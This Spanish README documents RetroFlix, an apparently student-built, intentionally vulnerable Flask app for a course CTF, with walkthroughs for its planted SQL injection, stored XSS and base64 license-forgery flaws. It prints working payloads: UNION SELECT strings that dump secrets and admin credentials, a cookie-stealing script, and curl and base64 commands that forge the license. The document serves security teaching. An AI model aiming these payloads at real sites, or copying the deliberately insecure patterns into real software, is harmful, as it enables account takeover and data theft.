# 🎬 RetroFlix — Aplicación web vulnerable (Trabajo Integrador DSA 2026)

RetroFlix es una plataforma ficticia de cine clásico desarrollada en **Python +
Flask** que corre en **Docker**. Es **intencionalmente vulnerable** con fines
educativos para el CTF de la cátedra.

Contiene **3 vulnerabilidades del OWASP Top 10**, una por vista, sin RCE ni
ninguna falla que comprometa el servidor de la cátedra.

| Vista      | Vulnerabilidad                  | OWASP                             | Flag          |
| ---------- | ------------------------------- | --------------------------------- | ------------- |
| `/buscar`  | SQL Injection (UNION)           | A05:2025 – Injection              | `FLAG_SQLI`   |
| `/reviews` | Stored XSS                      | A05:2025 – Injection (XSS)        | `FLAG_XSS`    |
| `/premium` | Licencia en base64 (no cifrada) | A04:2025 – Cryptographic Failures | `FLAG_CRYPTO` |

---

## 👤 Autores

Grupo **NmapTeam**

- Ventos Valentín
- Rivas Lucas
- Mendoza Dib Joaquín

---

## 🐳 Cómo ejecutarla (Docker)

### Con docker-compose (recomendado)

```bash
cd trabajo_integrador
docker compose up --build
```

La app queda disponible en **http://localhost:5000**

### Con Docker a secas

```bash
cd trabajo_integrador
docker build -t retroflix .
docker run -p 5000:5000 retroflix
```

Archivos relevantes:

- `Dockerfile` — imagen `python:3.12-slim`, instala Flask y ejecuta `app.py`.
- `docker-compose.yml` — publica el puerto `5000` y define las flags por entorno.

---

## 🚩 Cómo setear / cambiar una flag

Las flags se configuran por **variables de entorno**.
La forma más simple es editar `docker-compose.yml`:

```yaml
environment:
  FLAG_SQLI: "FLAG{tu_flag_sqli}"
  FLAG_XSS: "FLAG{tu_flag_xss}"
  FLAG_CRYPTO: "FLAG{tu_flag_crypto}"
```

O al ejecutar el contenedor:

```bash
docker run -p 5000:5000 \
  -e FLAG_SQLI="FLAG{...}" \
  -e FLAG_XSS="FLAG{...}" \
  -e FLAG_CRYPTO="FLAG{...}" \
  retroflix
```

Si no se setean, se usan los valores por defecto definidos en `app.py`.
La base de datos SQLite se **regenera (con la flag de SQLi actualizada) en cada
arranque**, así que basta con reiniciar el contenedor tras cambiar las variables.

---

## 💥 Forma de explotarlo

### 1) SQL Injection — `/buscar`

El buscador arma la query concatenando el input sin sanitizar:

```python
"SELECT title, year, genre FROM movies WHERE title LIKE '%" + q + "%'"
```

La consulta devuelve **3 columnas**, por lo que se puede usar un `UNION SELECT`
para leer otras tablas (incluida la tabla oculta `secrets` con la flag, y la
tabla `users` con las credenciales del admin).

**Exploit** — pegar en el buscador o en la URL:

```
' UNION SELECT flag, name, 'x' FROM secrets-- -
```

URL directa:

```
http://localhost:5000/buscar?q=' UNION SELECT flag,name,'x' FROM secrets-- -
```

➡️ Aparece `FLAG{sql1_un10n_r3tr0fl1x_l34k}` en la tabla de resultados.

**Bonus:** dumpear las credenciales del admin:

```
' UNION SELECT username, password, 'x' FROM users-- -
```

---

### 2) Stored XSS — `/reviews`

El cuerpo de las reseñas se renderiza **sin escapar** (`{{ r.body | safe }}` en
Jinja2). Además, el panel del administrador (`/admin`) renderiza las mismas
reseñas y tiene una **cookie sensible accesible por JavaScript** (`httponly=False`).

**Exploit:**

1. En `/reviews`, publicar una reseña con este cuerpo:

   ```html
   <script>
     fetch("/collect?c=" + encodeURIComponent(document.cookie));
   </script>
   ```

2. Cuando el **administrador** abre su panel de moderación (`/admin`), el script
   se ejecuta en su contexto y envía su cookie al servidor del atacante
   (`/collect`).

   > En este entorno local podés "actuar de admin víctima" abriendo
   > **http://localhost:5000/admin** en el navegador: la cookie del admin se
   > setea ahí y el payload almacenado la exfiltra automáticamente.

3. El atacante revisa **http://localhost:5000/collect** y ve la cookie robada.

➡️ Se captura `admin_flag=FLAG{st0r3d_xss_c00k13_st34l3r}`.

---

### 3) Falla criptográfica — licencia en base64 (no cifrada) — `/premium`

La licencia premium viaja en la cookie `license`. El servidor la presenta como
si estuviera "protegida", pero **no está cifrada: es solo base64 de un JSON**.
"Encoding no es encryption" → cualquiera puede decodificarla, modificarla y
volver a codificarla (OWASP A02: Cryptographic Failures).

Ejemplo del contenido de un usuario gratuito:

```json
{ "user": "guest", "premium": false, "role": "user" }
```

**Exploit:**

1. Visitar `/premium`: se entrega la cookie `license` y la página muestra el
   contenido decodificado, dejando claro que es base64.
2. Decodificar el token, cambiar `"premium": false` por `"premium": true` y
   volver a codificar en base64:

   ```bash
   # decodificar
   echo "eyJ1c2VyIjogImd1ZXN0IiwgInByZW1pdW0iOiBmYWxzZSwgInJvbGUiOiAidXNlciJ9" | base64 -d
   # -> {"user": "guest", "premium": false, "role": "user"}

   # forjar premium=true
   echo -n '{"user":"guest","premium":true,"role":"user"}' | base64
   # -> eyJ1c2VyIjoiZ3Vlc3QiLCJwcmVtaXVtIjp0cnVlLCJyb2xlIjoidXNlciJ9
   ```

3. Enviar la licencia forjada como cookie `license` (o pegarla desde las DevTools
   del navegador y recargar `/premium`):

   ```bash
   curl --cookie "license=eyJ1c2VyIjoiZ3Vlc3QiLCJwcmVtaXVtIjp0cnVlLCJyb2xlIjoidXNlciJ9" \
        http://localhost:5000/premium
   ```

➡️ El servidor activa la cuenta PREMIUM y entrega `FLAG{b4s364_n0_3s_3ncr1pt4r}`.

---

## ⚠️ Aclaración de seguridad

Esta aplicación **no contiene RCE** ni vulnerabilidades que pongan en riesgo el
servidor. Todas las fallas son de tipo _injection_ / _crypto_ acotadas a la
propia aplicación, según lo permitido por la consigna.
